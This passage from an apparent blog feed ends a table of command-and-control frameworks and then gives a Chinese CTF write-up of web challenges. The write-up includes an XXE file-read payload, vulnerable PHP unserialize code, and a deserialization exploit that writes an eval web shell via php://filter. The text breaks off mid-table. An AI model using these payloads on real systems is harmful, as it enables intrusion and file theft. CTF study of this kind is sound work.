href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Viper</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/FunnyWolf/Viper/">https://github.com/FunnyWolf/Viper/</a></td><td><a href="https://www.yuque.com/viper-en/inh85g/cvucxz">https://www.yuque.com/viper-en/inh85g/cvucxz</a></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>VirusTotalC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/D1rkMtr/VirusTotalC2">https://github.com/D1rkMtr/VirusTotalC2</a></td><td></td><td>@D1rkMtr</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Void-RAT</td><td>NA</td><td>NA</td><td><a href="https://github.com/KadeDev/Void-RAT">https://github.com/KadeDev/Void-RAT</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>No</td><td>NA</td><td></td><td></td></tr><tr><td>Voodoo</td><td>Commercial</td><td>$2,000</td><td></td><td><a href="https://s2.security/voodoo/">https://s2.security/voodoo/</a></td><td>@professor__plum</td><td>@kevinlustic</td><td>2&#x2F;12&#x2F;2020</td><td>0.2.3</td><td><a href="http://run.py/">run.py</a></td><td></td><td></td><td></td><td>Python</td><td>C++</td><td>Yes</td><td>Web</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>TLS + ChaCha20-Poly1305</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td><a href="http://s2universe.slack.com/">s2universe.slack.com</a></td><td>189</td><td>NA</td><td>Community edition available for evaluation and linked off the main site</td></tr><tr><td>Wareed DNS C2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Faisal-P27/WAREED-DNS-C2">https://github.com/Faisal-P27/WAREED-DNS-C2</a></td><td></td><td>@Faisal_P27</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>WarFox</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/FULLSHADE/WarFox/">https://github.com/FULLSHADE/WarFox/</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>WEASEL</td><td>MIT</td><td>NA</td><td><a href="https://github.com/facebookincubator/WEASEL">https://github.com/facebookincubator/WEASEL</a></td><td></td><td>@ucsenoi</td><td>@jorgeorchilles</td><td>12&#x2F;3&#x2F;2019</td><td>1</td><td>pip3</td><td></td><td></td><td></td><td>Python</td><td>Python</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>3</td><td>Beacons via DNS</td></tr><tr><td>Zuthaka</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/pucarasec/zuthaka">https://github.com/pucarasec/zuthaka</a></td><td></td><td>@pucara</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>神州数码DCFW-1800CTF题目wp</title>
    <link href="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/"/>
    <url>/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/</url>
    
    <content type="html"><![CDATA[<p>神州数码DCFW-1800CTF题目，两年前打的，整理笔记传入博客备份管理</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1、web-xxe"><a href="#1、web-xxe" class="headerlink" title="1、web_xxe"></a>1、web_xxe</h2><p>来自 <a href="http://192.168.1.200/race.php/soldier/checkpoint?level_id=755&amp;id=137&amp;scenes_id=52&amp;key=0">http://192.168.1.200/race.php/soldier/checkpoint?level_id=755&amp;id=137&amp;scenes_id=52&amp;key=0</a> </p><p>这道题目个人感觉有点离谱，因为传入的xxepayload完全是混乱的，后续我是通过后端代码和payload传进去调整的。。</p><p>一．通过抓包分析有ｃｏｏｋｉｅ经行bash64解码发现是  </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210734054.png" alt="image-20241024210734054"></p><p>存在<em>xxe</em>头  </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210751666.png" alt="image-20241024210751666"></p><p>所以把<em>xxe</em>攻击代码构造好再base64编码后发用BP改ｃｏｏｋｉｅ发送 <em>Xxe</em>代码为]&gt;  </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210808927.png" alt="image-20241024210808927"></p><p>成功读取到文件。 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210825367.png" alt="image-20241024210825367"></p><p>修改<em>xxe</em>代码读取flag.txt文件</p><p>payload:</p><p><code>&lt;?xml version=＂1.0＂ encoding=＂UTF-8＂?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM ＂[file:///flag.txt](file:///flag.txt)＂ &gt;]&gt;</code></p><p>参数email&#x3D;123q％26<em>xxe</em>;q.com  </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210849373.png" alt="image-20241024210849373"></p><h2 id="2、-WEB-simple-ser"><a href="#2、-WEB-simple-ser" class="headerlink" title="2、!WEB_simple_ser"></a>2、!WEB_simple_ser</h2><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;arr <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;cls-&gt;<span class="hljs-variable">$v</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;hello.php&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;fileput&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fileput</span>();<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;                       <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileput</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || <br>            <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-string">&#x27;\\&#x27;</span>) !== <span class="hljs-literal">false</span>) <br>            <span class="hljs-keyword">die</span>();<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$content</span> .= <span class="hljs-variable language_">$this</span>-&gt;txt;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>))&#123;<br>    <span class="hljs-variable">$cls</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]);<br>    <span class="hljs-variable">$instance</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cls</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<br>    <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>1.exp: <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211547997.png" alt="image-20241024211547997"></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cls</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arr</span>; <br><br>&#125; <br><br> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$txt</span>; <br><br>&#125; <br><br> <br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>(); <br><br><span class="hljs-variable">$a</span> -&gt; cls = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>(); <br><br><span class="hljs-variable">$a</span> -&gt; arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;fileput&quot;</span> =&gt; <span class="hljs-string">&quot;fileput&quot;</span>); <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; filename = <span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shella.php&quot;</span>; <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; txt = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);&#x27;</span>; <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; txt = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span> -&gt; cls -&gt; txt); <br><br> <br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)); <br><br>  <br></code></pre></div></td></tr></table></figure><h2 id="3、WEB-unserialize-0ctf"><a href="#3、WEB-unserialize-0ctf" class="headerlink" title="3、WEB_unserialize_0ctf"></a>3、WEB_unserialize_0ctf</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211838818.png" alt="image-20241024211838818"></p><p>扫描，发现<a href="http://www.zip备份/">www.zip备份</a> </p><p>flag在config里边 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211849645.png" alt="image-20241024211849645"></p><p>register.php注册账号后，profile.php设置一些参数，危险函数在photo中，这边将上传的photobase64编码 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211901120.png" alt="image-20241024211901120"></p><p>class类中，如果有含有关键词，就替换成hacker，这里一个个测试，看看，发现nickname设置成关键字就会替换成hacker，需要序列化逃逸， </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211917464.png" alt="image-20241024211917464"></p><p>通过nickname的字符逃逸然后逃逸出的在photo中，也就是config.php文件 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211929563.png" alt="image-20241024211929563"></p><p><a href="onenote:..\CTF\PHPCTF\PHP反序列化字符串逃逸.one#section-id={67556CA1-5694-4A97-9FA9-E92D5CB4AB0C}&end&base-path=https://d.docs.live.net/5fd9226643f52715/文档/我的网安学习之路（服了我自己了）">字符串逃逸</a>就是将需要查看需要逃逸出来的字段，查看有几位，比如传入4位字符，然后正则将其替换成5位字符，就会多一位出来，这样传入就可以将剩下的逃逸出来 </p><p>正常的序列，标红的是要逃逸出来的字符串，34个字符串 </p><p>O:1:”a”:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:10:”<a href="mailto:&#49;&#x32;&#x33;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#x32;&#x33;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:3:”123”;}s:5:”photo”;s:10:”config.php”;} </p><p>34个where </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211955794.png" alt="image-20241024211955794"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212006538.png" alt="image-20241024212006538"></p><h2 id="4、WEB-babyphp"><a href="#4、WEB-babyphp" class="headerlink" title="4、WEB_babyphp"></a>4、WEB_babyphp</h2><p>简单覆盖就行了</p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212056153.png" alt="image-20241024212056153"></p><h2 id="5、eval-vardump"><a href="#5、eval-vardump" class="headerlink" title="5、eval_vardump"></a>5、eval_vardump</h2><p>闭合绕过</p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212139000.png" alt="image-20241024212139000"></p><h2 id="6、WEB-easygame"><a href="#6、WEB-easygame" class="headerlink" title="6、WEB_easygame"></a>6、WEB_easygame</h2><p>跟着操作就行了，get传值，post传值，改X-Forwarded-For </p><h2 id="7、WEB-web-phpmd5"><a href="#7、WEB-web-phpmd5" class="headerlink" title="7、WEB_web_phpmd5"></a>7、WEB_web_phpmd5</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212210101.png" alt="image-20241024212210101"></p><h2 id="8、WEB-xx"><a href="#8、WEB-xx" class="headerlink" title="8、WEB_xx"></a>8、WEB_xx</h2><p>具体是要xss，直接控制面板弹个窗就行了，通杀</p><h2 id="9、WEB-simplepop-wc"><a href="#9、WEB-simplepop-wc" class="headerlink" title="9、WEB_simplepop_wc"></a>9、WEB_simplepop_wc</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212352536.png" alt="image-20241024212352536"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212359310.png" alt="image-20241024212359310"></p><p>useless.php</p><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//flag.php</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="hljs-comment">//2</span><br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-comment">//1</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></div></td></tr></table></figure><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212459640.png" alt="image-20241024212459640"></p><h2 id="10、WEB-smiplecode-wc"><a href="#10、WEB-smiplecode-wc" class="headerlink" title="10、WEB_smiplecode_wc"></a>10、WEB_smiplecode_wc</h2><p>git泄露或者查看源代码index.php <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212536891.png" alt="image-20241024212536891"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212543302.png" alt="image-20241024212543302"></p><p>有个index，访问看看，有个getflag，进去，审计代码 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212550522.png" alt="image-20241024212550522"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212604245.png" alt="image-20241024212604245"></p><table><thead><tr><th>preg_match的概念</th></tr></thead><tbody><tr><td>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 